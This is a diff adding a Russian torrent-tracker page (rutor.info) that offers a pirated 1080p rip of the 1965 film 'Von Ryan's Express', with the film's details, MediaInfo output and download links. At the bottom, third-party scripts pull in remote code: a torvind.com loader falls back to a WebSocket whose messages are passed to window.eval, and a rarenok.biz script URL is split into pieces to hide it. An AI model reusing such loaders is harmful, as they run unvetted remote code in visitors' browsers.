@@ -1,0 +1,506 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Экспресс Фон Райана / Von Ryan&#039;s Express (1965) BDRip 1080p | P, P2</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Экспресс Фон Райана / Von Ryan&#039;s Express (1965) BDRip 1080p | P, P2</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:804aa3b144852a74d6cb0c9b9e706876ac1ef7ff&amp;dn=rutor.info_%D0%AD%D0%BA%D1%81%D0%BF%D1%80%D0%B5%D1%81%D1%81+%D0%A4%D0%BE%D0%BD+%D0%A0%D0%B0%D0%B9%D0%B0%D0%BD%D0%B0+%2F+Von+Ryan%27s+Express+%281965%29+BDRip+1080p+%7C+P%2C+P2&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630482"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630482"><img src="http://s.rutor.info/t/down.png"> Скачать Von.Ryans.Express.1965.1080p.mkv.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://a.radikal.ru/a21/1805/36/8aaf2a810867.jpg" /><br />
+<br />
+<u>Информация о фильме</u><br />
+<b>Название: </b>Экспресс Фон Райана<br />
+<b>Оригинальное название: </b>Von Ryan&#039;s Express<br />
+<b>Год выхода: </b>1965<br />
+<b>Жанр: </b> <a href="/tag/1/Боевик" target="_blank">Боевик</a>, <a href="/tag/1/военный" target="_blank">военный</a>, <a href="/tag/1/приключения" target="_blank">приключения</a>, <a href="/tag/1/экранизация" target="_blank">экранизация</a><br />
+<b>Режиссер: </b>Марк Робсон<br />
+<b>В ролях: </b>Фрэнк Синатра, Тревор Ховард, Раффаэлла Карра, Брэд Декстер, Серджо Фантони, Джон Лейтон, Эдвард Малхейр, Вольфган Прейсс, Джеймс Бролин, Джон Ван Дрилен<br />
+<br />
+<b>О фильме:</b><br />
+Вторая мировая война. Американский военный летчик Джозеф Райан попадпет в лагерь для военнопленных, находящийся в Италии. Большинство заключенных лагеря – солдаты Союзнической армии, в основном англичане. Но полковник Райан, решительный и изобретательный, не хочет мириться с судьбой и пассивно ждать своей участи. Он организовывает побег заключенных, и придумывает, как захватить немецкий поезд, направляющийся в Швейцарию...<br />
+<br />
+<br />
+ <a href="http://www.imdb.com/title/tt0059885/" target="_blank"><img src="http://s.rutor.info/imdb/pic/0059885.gif" /></a> <a href="http://www.kinopoisk.ru/film/7012/" target="_blank"><img src="http://www.kinopoisk.ru/rating/7012.gif" /></a><br />
+<br />
+<b>Страна: </b>США<br />
+<b>Студия: </b>20th Century Fox Film Corporation, P-R Productions Picture<br />
+<b>Продолжительность: </b>01:56:52<br />
+<b>Перевод: </b>Профессиональный многоголосый, профессиональный двухголосый<br />
+<br />
+<u>Файл</u><br />
+<b>Кодек: </b>x.264<br />
+<b>Качество: </b>BDRip 1080p<br />
+<b>Видео: </b>MPEG-4 AVC, 1920x816, ~8221 Kбит/с, 23.976 кадр/с<br />
+<b>Звук: </b><br />
+<b>Аудио #1: </b> Русский ( АС3, 2ch, 192 Кбит/с, 48.0 KHz) Профессиональный (многоголосый, закадровый) <b>Первый канал </b><br />
+<b>Аудио #2: </b> Русский ( АС3, 2ch, 192 Кбит/с, 48.0 KHz) Профессиональный (двухголосый, закадровый) <br />
+<b>Аудио #3: </b> Английский ( АС3, 6ch, 384 Кбит/с, 48.0 KHz)<br />
+<b>Субтитры: </b>английские<br />
+<b><a href="https://www.kinopoisk.ru/film/ekspress-fon-rayena-1965-7012/video/" target="_blank">Трейлер</a></b><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Доп. информация:</div><div class="hidebody"></div><textarea class="hidearea">► Фильм снят по одноимённому роману Дэвида Уэстхеймера.<br />
+► Фильм стал одним из самых успешных фильмов в фильмографии Фрэнка Синатры, а также это была одна из самых высокооплачиваемых ролей для актера.<br />
+► Фильм вошел в Британский список 100 величайших фильмов о войне по № 89.<br />
+<br />
+</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">MediaInfo</div><div class="hidebody"></div><textarea class="hidearea"> Источник: Von.Ryans.Express.1965.1080p.BluRay.x264-HD4U<br />
+General<br />
+Unique ID                      : 190970839960140073439479224007909594673 (0x8FABA55AE88AE192B4761A088B665631)<br />
+Complete name                  : Von.Ryans.Express.1965.1080p.mkv<br />
+Format                         : Matroska<br />
+Format version                 : Version 4 / Version 2<br />
+File size                      : 7.34 GiB<br />
+Duration                       : 1 h 56 min<br />
+Overall bit rate               : 8 992 kb/s<br />
+Encoded date                   : UTC 2018-04-29 06:47:29<br />
+Writing application            : mkvmerge v7.1.0 (&#039;Good Love&#039;) 64bit built on Jul 27 2014 13:06:55<br />
+Writing library                : libebml v1.3.0 + libmatroska v1.4.1<br />
+<br />
+Video<br />
+ID                             : 1<br />
+Format                         : AVC<br />
+Format/Info                    : Advanced Video Codec<br />
+Format profile                 : High@L4.1<br />
+Format settings                : CABAC / 5 Ref Frames<br />
+Format settings, CABAC         : Yes<br />
+Format settings, ReFrames      : 5 frames<br />
+Codec ID                       : V_MPEG4/ISO/AVC<br />
+Duration                       : 1 h 56 min<br />
+Bit rate                       : 8 221 kb/s<br />
+Width                          : 1 920 pixels<br />
+Height                         : 816 pixels<br />
+Display aspect ratio           : 2.35:1<br />
+Frame rate mode                : Constant<br />
+Frame rate                     : 23.976 FPS<br />
+Color space                    : YUV<br />
+Chroma subsampling             : 4:2:0<br />
+Bit depth                      : 8 bits<br />
+Scan type                      : Progressive<br />
+Bits/(Pixel*Frame)             : 0.219<br />
+Stream size                    : 6.71 GiB (91%)<br />
+Writing library                : x264 core 124 r2197 69a0443<br />
+Encoding settings              : cabac=1 / ref=5 / deblock=1:0:0 / analyse=0x3:0x133 / me=umh / subme=7 / psy=1 / psy_rd=1.00:0.00 / mixed_ref=1 / me_range=16 / chroma_me=1 / trellis=1 / 8x8dct=1 / cqm=0 / deadzone=21,11 / fast_pskip=0 / chroma_qp_offset=-2 / threads=12 / sliced_threads=0 / nr=0 / decimate=1 / interlaced=0 / bluray_compat=0 / constrained_intra=0 / bframes=3 / b_pyramid=2 / b_adapt=1 / b_bias=0 / direct=1 / weightb=1 / open_gop=0 / weightp=2 / keyint=250 / keyint_min=23 / scenecut=40 / intra_refresh=0 / rc_lookahead=40 / rc=2pass / mbtree=1 / bitrate=8221 / ratetol=1.0 / qcomp=0.60 / qpmin=0 / qpmax=69 / qpstep=4 / cplxblur=20.0 / qblur=0.5 / ip_ratio=1.40 / aq=1:1.00<br />
+Language                       : English<br />
+Default                        : Yes<br />
+Forced                         : No<br />
+<br />
+Audio #1<br />
+ID                             : 2<br />
+Format                         : AC-3<br />
+Format/Info                    : Audio Coding 3<br />
+Codec ID                       : A_AC3<br />
+Duration                       : 1 h 56 min<br />
+Bit rate mode                  : Constant<br />
+Bit rate                       : 192 kb/s<br />
+Channel(s)                     : 2 channels<br />
+Channel positions              : Front: L R<br />
+Sampling rate                  : 48.0 kHz<br />
+Frame rate                     : 31.250 FPS (1536 SPF)<br />
+Bit depth                      : 16 bits<br />
+Compression mode               : Lossy<br />
+Stream size                    : 161 MiB (2%)<br />
+Title                          : MVO<br />
+Language                       : Russian<br />
+Service kind                   : Complete Main<br />
+Default                        : Yes<br />
+Forced                         : No<br />
+<br />
+Audio #2<br />
+ID                             : 3<br />
+Format                         : AC-3<br />
+Format/Info                    : Audio Coding 3<br />
+Codec ID                       : A_AC3<br />
+Duration                       : 1 h 56 min<br />
+Bit rate mode                  : Constant<br />
+Bit rate                       : 192 kb/s<br />
+Channel(s)                     : 2 channels<br />
+Channel positions              : Front: L R<br />
+Sampling rate                  : 48.0 kHz<br />
+Frame rate                     : 31.250 FPS (1536 SPF)<br />
+Bit depth                      : 16 bits<br />
+Compression mode               : Lossy<br />
+Stream size                    : 161 MiB (2%)<br />
+Title                          : DVO<br />
+Language                       : Russian<br />
+Service kind                   : Complete Main<br />
+Default                        : No<br />
+Forced                         : No<br />
+<br />
+Audio #3<br />
+ID                             : 4<br />
+Format                         : AC-3<br />
+Format/Info                    : Audio Coding 3<br />
+Codec ID                       : A_AC3<br />
+Duration                       : 1 h 56 min<br />
+Bit rate mode                  : Constant<br />
+Bit rate                       : 384 kb/s<br />
+Channel(s)                     : 6 channels<br />
+Channel positions              : Front: L C R, Side: L R, LFE<br />
+Sampling rate                  : 48.0 kHz<br />
+Frame rate                     : 31.250 FPS (1536 SPF)<br />
+Bit depth                      : 16 bits<br />
+Compression mode               : Lossy<br />
+Stream size                    : 321 MiB (4%)<br />
+Language                       : English<br />
+Service kind                   : Complete Main<br />
+Default                        : No<br />
+Forced                         : No<br />
+<br />
+Text<br />
+ID                             : 5<br />
+Format                         : UTF-8<br />
+Codec ID                       : S_TEXT/UTF8<br />
+Codec ID/Info                  : UTF-8 Plain Text<br />
+Duration                       : 1 h 56 min<br />
+Bit rate                       : 38 b/s<br />
+Count of elements              : 873<br />
+Stream size                    : 33.0 KiB (0%)<br />
+Language                       : English<br />
+Default                        : No<br />
+Forced                         : No<br />
+<br />
+Menu<br />
+00:00:00.000                   : en:00:00:00.000<br />
+00:02:38.784                   : en:00:02:38.784<br />
+00:04:20.510                   : en:00:04:20.510<br />
+00:06:00.735                   : en:00:06:00.735<br />
+00:09:59.140                   : en:00:09:59.140<br />
+00:13:03.866                   : en:00:13:03.866<br />
+00:14:58.523                   : en:00:14:58.523<br />
+00:17:13.783                   : en:00:17:13.783<br />
+00:21:56.524                   : en:00:21:56.524<br />
+00:25:59.183                   : en:00:25:59.183<br />
+00:31:38.730                   : en:00:31:38.730<br />
+00:35:11.359                   : en:00:35:11.359<br />
+00:39:03.341                   : en:00:39:03.341<br />
+00:44:14.944                   : en:00:44:14.944<br />
+00:48:35.746                   : en:00:48:35.746<br />
+00:54:08.537                   : en:00:54:08.537<br />
+00:57:38.372                   : en:00:57:38.372<br />
+01:01:50.874                   : en:01:01:50.874<br />
+01:05:14.619                   : en:01:05:14.619<br />
+01:11:36.000                   : en:01:11:36.000<br />
+01:16:15.571                   : en:01:16:15.571<br />
+01:19:05.658                   : en:01:19:05.658<br />
+01:23:06.273                   : en:01:23:06.273<br />
+01:27:32.164                   : en:01:27:32.164<br />
+01:29:16.434                   : en:01:29:16.434<br />
+01:34:01.928                   : en:01:34:01.928<br />
+01:37:50.364                   : en:01:37:50.364<br />
+01:41:35.923                   : en:01:41:35.923<br />
+01:46:39.268                   : en:01:46:39.268<br />
+01:49:30.230                   : en:01:49:30.230<br />
+01:54:43.710                   : en:01:54:43.710<br />
+01:56:12.007                   : en:01:56:12.007<br />
+<br />
+</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="https://c.radikal.ru/c31/1805/95/26e75713f7e3.jpg" target="_blank"><img src="https://c.radikal.ru/c31/1805/95/26e75713f7e3t.jpg" /></a> <a href="https://c.radikal.ru/c06/1805/f3/fb92f02fcb9e.jpg" target="_blank"><img src="https://c.radikal.ru/c06/1805/f3/fb92f02fcb9et.jpg" /></a> <a href="https://b.radikal.ru/b22/1805/45/9f8620790fa9.jpg" target="_blank"><img src="https://b.radikal.ru/b22/1805/45/9f8620790fa9t.jpg" /></a> <a href="https://d.radikal.ru/d07/1805/f6/fb1fa7b694f6.jpg" target="_blank"><img src="https://d.radikal.ru/d07/1805/f6/fb1fa7b694f6t.jpg" /></a> <a href="https://d.radikal.ru/d32/1805/67/11b19215cd7d.jpg" target="_blank"><img src="https://d.radikal.ru/d32/1805/67/11b19215cd7dt.jpg" /></a> <a href="https://c.radikal.ru/c35/1805/93/5e42778f314b.jpg" target="_blank"><img src="https://c.radikal.ru/c35/1805/93/5e42778f314bt.jpg" /></a> <a href="https://a.radikal.ru/a13/1805/55/b9a24a6f7e51.jpg" target="_blank"><img src="https://a.radikal.ru/a13/1805/55/b9a24a6f7e51t.jpg" /></a> <a href="https://a.radikal.ru/a24/1805/91/52caa95f52ab.jpg" target="_blank"><img src="https://a.radikal.ru/a24/1805/91/52caa95f52abt.jpg" /></a> <a href="https://b.radikal.ru/b13/1805/56/a2041c948200.jpg" target="_blank"><img src="https://b.radikal.ru/b13/1805/56/a2041c948200t.jpg" /></a> <a href="https://c.radikal.ru/c30/1805/a9/6692f50bc09e.jpg" target="_blank"><img src="https://c.radikal.ru/c30/1805/a9/6692f50bc09et.jpg" /></a> <a href="https://b.radikal.ru/b23/1805/a3/99494c71d1fd.jpg" target="_blank"><img src="https://b.radikal.ru/b23/1805/a3/99494c71d1fdt.jpg" /></a> <a href="https://c.radikal.ru/c39/1805/54/e1e47f0a8bc6.jpg" target="_blank"><img src="https://c.radikal.ru/c39/1805/54/e1e47f0a8bc6t.jpg" /></a></textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1521348/0" target="_blank">ussr2011</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/kino" target="_blank">Зарубежные фильмы</a></td></tr>
+<tr><td class="header">Раздают</td><td>14</td></tr>
+<tr><td class="header">Качают</td><td>6</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (19 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 14:09:13  (18 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>7.34&nbsp;GB  (7881897078 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630482);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>13&nbsp;Апр&nbsp;14</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/349532"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:903f675a82a7e52734bf13e9c6ef49ddf81f5891&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/349532/jekspress-fon-rajena_von-ryans-express-1965-dvdrip-p2-p">Экспресс Фон Райена / Von Ryan&#039;s Express (1965) DVDRip | P2, P </a></td> 
+<td align="right">2.06&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/1/0/0/Von Ryan" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630482.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630482">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630482);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630482);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630482">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
